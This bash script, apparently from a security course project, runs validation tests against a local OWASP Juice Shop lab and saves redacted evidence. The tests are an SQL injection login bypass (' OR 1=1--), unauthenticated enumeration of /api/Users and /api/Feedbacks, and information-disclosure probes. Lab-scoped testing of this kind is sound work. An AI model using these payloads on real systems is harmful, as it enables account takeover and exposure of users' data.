#!/usr/bin/env bash
# ============================================================================
# CS-02 Controlled Validation Evidence Capture
# ============================================================================
# Authorized use ONLY against the local OWASP Juice Shop lab (127.0.0.1:3000).
#
# WHAT:  Executes a small set of controlled security tests and captures the
#        raw request + response into evidence/ with sensitive values REDACTED.
# WHY:   The PDF requires original lab evidence, and also forbids storing
#        passwords / API keys / session tokens / real personal information.
#        This script satisfies both: it records real output but masks tokens.
# WHERE: Run from the cybersecurity-cs02/ project root on the lab host.
# EXPECTED: Evidence files appear under evidence/requests|responses|findings.
# ERROR:  Non-zero exit, or empty evidence files.
# RECOVERY: Re-run; evidence files are overwritten deterministically.
#
# Usage: bash scripts/evidence/capture_validation.sh
# ============================================================================

set -u
BASE="http://127.0.0.1:3000"
EV="evidence"
DATE="$(date -Iseconds)"

mkdir -p "$EV/requests" "$EV/responses" "$EV/findings"

# Redact JWTs and long bearer-looking strings so no token is ever stored.
redact() {
  sed -E \
    -e 's/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}/[REDACTED-JWT]/g' \
    -e 's/("[Pp]assword"[[:space:]]*:[[:space:]]*")[^"]*"/\1[REDACTED]"/g' \
    -e 's/(Bearer )[A-Za-z0-9._-]{16,}/\1[REDACTED]/g'
}

log() { echo "[capture] $*"; }

# ---------------------------------------------------------------------------
# VALIDATION 1 - SQL Injection authentication bypass  -> WEB-VUL-001
# ---------------------------------------------------------------------------
log "V1: SQL injection login bypass"
REQ1="$EV/requests/WEB-VUL-001-request.txt"
RES1="$EV/responses/WEB-VUL-001-response.txt"

cat > "$REQ1" <<EOF
# Evidence ID: EVD-V1-REQ
# Finding: WEB-VUL-001 (SQL Injection – Authentication Bypass)
# Date: $DATE
# Target: POST $BASE/rest/user/login
# NOTE: lab-only test account payloads; no real credentials.
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{"email":"' OR 1=1--","password":"x"}
EOF

# Control (negative) test: legitimate invalid credentials -> expect 401
CTRL_CODE=$(curl -s -o "$RES1.control" -w "%{http_code}" -X POST "$BASE/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"definitely-not-a-user@invalid.local","password":"wrong"}')

# Attack test: SQLi payload -> vulnerable if 200 + token
ATTACK_CODE=$(curl -s -o "$RES1.attack.raw" -w "%{http_code}" -X POST "$BASE/rest/user/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")

redact < "$RES1.attack.raw" > "$RES1"
rm -f "$RES1.attack.raw" "$RES1.control"

{
  echo "# Evidence ID: EVD-V1-RES"
  echo "# Finding: WEB-VUL-001"
  echo "# Date: $DATE"
  echo "# Control (invalid creds) HTTP : $CTRL_CODE   (expected 401)"
  echo "# Attack  (' OR 1=1--)  HTTP   : $ATTACK_CODE   (vulnerable if 200)"
  echo "# Verdict:"
  if [ "$CTRL_CODE" = "401" ] && [ "$ATTACK_CODE" = "200" ]; then
    echo "   VULNERABLE - auth bypass succeeded"
  else
    echo "   NOT REPRODUCED (control=$CTRL_CODE attack=$ATTACK_CODE)"
  fi
  echo "# Response body (tokens redacted):"
  cat "$RES1"
} > "$EV/findings/WEB-VUL-001-validation.txt"

log "  control=$CTRL_CODE attack=$ATTACK_CODE"

# ---------------------------------------------------------------------------
# VALIDATION 2 - Broken Access Control on /api/Users  -> WEB-VUL-002
# ---------------------------------------------------------------------------
log "V2: Broken access control /api/Users"
REQ2="$EV/requests/WEB-VUL-002-request.txt"
RES2="$EV/responses/WEB-VUL-002-response.txt"

cat > "$REQ2" <<EOF
# Evidence ID: EVD-V2-REQ
# Finding: WEB-VUL-002 (Broken Access Control / Sensitive Data Exposure via API)
# Date: $DATE
# Target: GET $BASE/api/Users  (unauthenticated)
GET /api/Users HTTP/1.1
Host: 127.0.0.1:3000
EOF

UNAUTH_CODE=$(curl -s -o "$RES2.unauth.raw" -w "%{http_code}" "$BASE/api/Users")
redact < "$RES2.unauth.raw" > "$RES2"
rm -f "$RES2.unauth.raw"

{
  echo "# Evidence ID: EVD-V2-RES"
  echo "# Finding: WEB-VUL-002"
  echo "# Date: $DATE"
  echo "# Unauthenticated GET /api/Users HTTP: $UNAUTH_CODE"
  echo "# If 200 -> user records enumerable without auth (Broken Access Control)"
  echo "# Response body (tokens redacted):"
  head -c 2000 "$RES2"; echo
} > "$EV/findings/WEB-VUL-002-validation.txt"

log "  unauth /api/Users=$UNAUTH_CODE"

# ---------------------------------------------------------------------------
# VALIDATION 3 - Missing Security Headers  -> WEB-VUL-003
# ---------------------------------------------------------------------------
log "V3: Missing security headers"
HDR="$EV/responses/WEB-VUL-003-headers.txt"
curl -s -I "$BASE/" > "$HDR"
{
  echo "# Evidence ID: EVD-V3-RES"
  echo "# Finding: WEB-VUL-003 (Missing Security Headers)"
  echo "# Date: $DATE"
  echo "# Full response headers for GET $BASE/ :"
  cat "$HDR"
} > "$EV/findings/WEB-VUL-003-validation.txt"
log "  headers captured"

# ---------------------------------------------------------------------------
# VALIDATION 4 - Information Disclosure via /metrics + version  -> WEB-VUL-004
# ---------------------------------------------------------------------------
log "V4: Information disclosure (/metrics, /rest/admin/application-version)"
MET="$EV/responses/WEB-VUL-004-metrics.txt"
VER="$EV/responses/WEB-VUL-004-version.txt"
MCODE=$(curl -s -o "$MET" -w "%{http_code}" "$BASE/metrics")
VCODE=$(curl -s -o "$VER" -w "%{http_code}" "$BASE/rest/admin/application-version")
{
  echo "# Evidence ID: EVD-V4-RES"
  echo "# Finding: WEB-VUL-004 (Security Misconfiguration / Info Disclosure)"
  echo "# Date: $DATE"
  echo "# GET /metrics -> HTTP $MCODE ($(wc -c < "$MET") bytes, unauthenticated)"
  echo "# GET /rest/admin/application-version -> HTTP $VCODE  body: $(cat "$VER")"
  echo "# robots.txt reveals: $(curl -s "$BASE/robots.txt" | tr '\n' ' ')"
} > "$EV/findings/WEB-VUL-004-validation.txt"
log "  metrics=$MCODE version=$VCODE"

# ---------------------------------------------------------------------------
# VALIDATION 5 - Unauthenticated access to user feedback  -> WEB-VUL-005
# ---------------------------------------------------------------------------
log "V5: Unauthenticated /api/Feedbacks"
FB="$EV/responses/WEB-VUL-005-feedbacks.json"
FCODE=$(curl -s -o "$FB" -w "%{http_code}" "$BASE/api/Feedbacks")
{
  echo "# Evidence ID: EVD-V5-RES"
  echo "# Finding: WEB-VUL-005 (Sensitive Data Exposure – user feedback)"
  echo "# Date: $DATE"
  echo "# GET /api/Feedbacks -> HTTP $FCODE ($(wc -c < "$FB") bytes, unauthenticated)"
  echo "# Sample (first 800 bytes):"
  head -c 800 "$FB"; echo
} > "$EV/findings/WEB-VUL-005-validation.txt"
log "  feedbacks=$FCODE"

echo
log "Done. Evidence written under $EV/"
